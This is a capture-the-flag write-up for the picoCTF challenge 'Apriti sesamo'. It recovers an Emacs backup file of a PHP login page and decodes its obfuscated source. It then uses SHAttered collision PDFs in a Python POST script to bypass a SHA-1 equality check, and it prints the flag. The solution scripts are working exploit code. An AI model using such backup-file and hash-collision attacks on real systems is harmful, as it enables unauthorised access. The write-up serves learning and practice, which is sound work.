# Apriti sesamo
## Description: 
I found a web app that claims to be impossible to hack! Try it here!

## Hints:
1. Backup files
2. Rumor has it, the lead developer is a militant emacs user

### Solution
1. The login page contains a username and password field for user to enter.
2. First, I quickly ChatGPT to find out what emacs file is about. _"File Encoding: Emacs sometimes generates backup files (filename~) or auto-save files (.#filename). Hidden information could be stored there."_
3. On the login page url, _http://verbal-sleep.picoctf.net:50313/impossibleLogin.php_, I try append the tilde character ~ and a backup _impossibleLogin.php~_ page is discovered.
4. Viewing the page source, we get the following php code for user authentication.
```
<?php
 if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}?>
```
5. However, it was base64 encoded. So, I try to decode it to read the encoded content.
```
import base64

values = [
    b"\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d",
    b"\143\x48\x64\x6b",
    b"\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75",
    b"\143\x48\144\153",
    b"\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d",
    b"\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75",
    b"\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75"
]

for v in values:
    print(base64.b64decode(v).decode(errors="ignore"))
```
6. The encoded contents are as follows:
```
username
pwd
username
pwd
<br/>Failed! No flag for you
../flag.txt
<br/>Failed! No flag for you
```
7. Wrapping up the whole thing, we have
```
<?php
if (isset($_POST["username"]) && isset($_POST["pwd"])) {
    $yuf85e0677 = $_POST["username"];
    $rs35c246d5 = $_POST["pwd"];

    if ($yuf85e0677 == $rs35c246d5) {
        echo "<br/>Failed! No flag for you";
    } else {
        if (sha1($yuf85e0677) === sha1($rs35c246d5)) {
            echo file_get_contents("../flag.txt");
        } else {
            echo "<br/>Failed! No flag for you";
        }
    }
}
?>

```
8. As we can observe, we need to enter different values for username and password fields. However, the SHA-1 digest for both fields must be equivalent.
9. So, I try to search for such values online but there is no such string. However, I came across this SHA-1 collision attack challenge and the question is basically similar. _https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi/_
10. The solution given is as follow:
```
import requests
import urllib2
rotimi = urllib2.urlopen("http://shattered.io/static/shattered-1.pdf").read()[:500];
letmein = urllib2.urlopen("http://shattered.io/static/shattered-2.pdf").read()[:500];
 
r = requests.get('http://54.202.82.13/', params={'name': rotimi, 'password': letmein});
print r.text

```
11. However, since the solution given above is using GET method, but we are using POST method, let's modify the source code.
```
import requests
import urllib.request

rotimi = urllib.request.urlopen("http://shattered.io/static/shattered-1.pdf").read()[:500]
letmein = urllib.request.urlopen("http://shattered.io/static/shattered-2.pdf").read()[:500]

r = requests.post('http://verbal-sleep.picoctf.net:50313/impossibleLogin.php', 
                  data={'username': rotimi, 'pwd': letmein})

print(r.text)

```
12. Run the code and we get the flag.
13. picoCTF{w3Ll_d3sErV3d_Ch4mp_5b269555}

